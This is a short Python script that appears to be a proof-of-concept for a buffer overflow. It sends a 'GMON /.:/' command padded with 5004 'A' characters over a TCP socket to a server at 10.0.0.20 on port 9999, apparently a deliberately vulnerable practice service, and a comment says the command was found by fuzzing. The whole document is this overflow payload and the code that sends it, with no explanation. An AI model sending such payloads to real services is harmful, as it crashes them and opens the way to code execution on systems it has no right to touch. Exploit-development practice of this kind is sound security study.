#!/usr/bin/python
import socket

cmd = "GMON /.:/"       # Found from fuzzer
pad = "A" * 5004

payload = cmd + pad        # Full payload

print("Len = ", (len(payload)))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('10.0.0.20',9999))

s.send(payload)

print("Sent Successfully!")
s.close()

